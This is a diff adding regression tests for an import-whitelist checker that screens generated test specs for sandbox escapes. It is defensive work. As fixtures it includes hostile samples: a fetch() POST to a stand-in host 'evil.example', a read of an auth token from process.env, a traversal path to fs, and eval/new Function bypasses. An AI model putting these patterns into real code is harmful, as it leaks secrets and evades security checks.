@@ -64,6 +64,66 @@ describe('import whitelist', () => {
     ].join('\n');
     assert.deepEqual(checkImportWhitelist(source, 'x.spec.ts'), []);
   });
+
+  it('rejects a re-export as well as a plain import ("export ... from")', () => {
+    const source = "export { readFileSync } from 'node:fs';\n";
+    const violations = checkImportWhitelist(source, 'x.spec.ts');
+    assert.equal(violations.length, 1);
+    assert.match(violations[0]!.reason, /node:fs/);
+  });
+
+  it('rejects a relative specifier that traverses back out of client/ despite starting with "client/" after one strip', () => {
+    // Naive prefix-check bug this regression test guards against: stripping
+    // one leading "../" turns this into "client/../../../fs", which starts
+    // with "client/" as a string - but really resolves to /fs once the
+    // remaining ".." segments are applied. Must still be rejected.
+    const source = "import { readFileSync } from '../client/../../../fs';\n";
+    const violations = checkImportWhitelist(source, 'x.spec.ts');
+    assert.equal(violations.length, 1);
+    assert.match(violations[0]!.reason, /\.\.\/client\/\.\.\/\.\.\/\.\.\/fs/);
+  });
+
+  it('still allows a legitimate nested-looking client/ import', () => {
+    const source = "import { apiClient } from '../client/apiClient';\n";
+    assert.deepEqual(checkImportWhitelist(source, 'x.spec.ts'), []);
+  });
+
+  it('rejects reading process.env with no import at all', () => {
+    const source = [
+      "test('x', async () => {",
+      '  const token = process.env.TARGET_AUTH_TOKEN;',
+      '});',
+      '',
+    ].join('\n');
+    const violations = checkImportWhitelist(source, 'x.spec.ts');
+    assert.equal(violations.length, 1);
+    assert.equal(violations[0]!.specifier, 'process');
+  });
+
+  it('rejects a bare fetch() call with no import at all', () => {
+    const source = "test('x', async () => {\n  await fetch('https://evil.example', { method: 'POST' });\n});\n";
+    const violations = checkImportWhitelist(source, 'x.spec.ts');
+    assert.equal(violations.length, 1);
+    assert.equal(violations[0]!.specifier, 'fetch');
+  });
+
+  it('rejects eval() and new Function(), the string-based bypass of the whole AST check', () => {
+    const source = [
+      "test('x', async () => {",
+      "  eval('require(\"fs\")');",
+      "  new Function('return process')();",
+      '});',
+      '',
+    ].join('\n');
+    const violations = checkImportWhitelist(source, 'x.spec.ts');
+    const specifiers = violations.map((v) => v.specifier).sort();
+    assert.deepEqual(specifiers, ['Function', 'eval']);
+  });
+
+  it('does not false-positive on legitimate generated code (apiClient, status, body, Math, Date)', () => {
+    const { source } = generate(wellFormedSpec, freshTargetDir());
+    assert.deepEqual(checkImportWhitelist(source, 'x.spec.ts'), []);
+  });
 });
 
 describe('AST checks', () => {
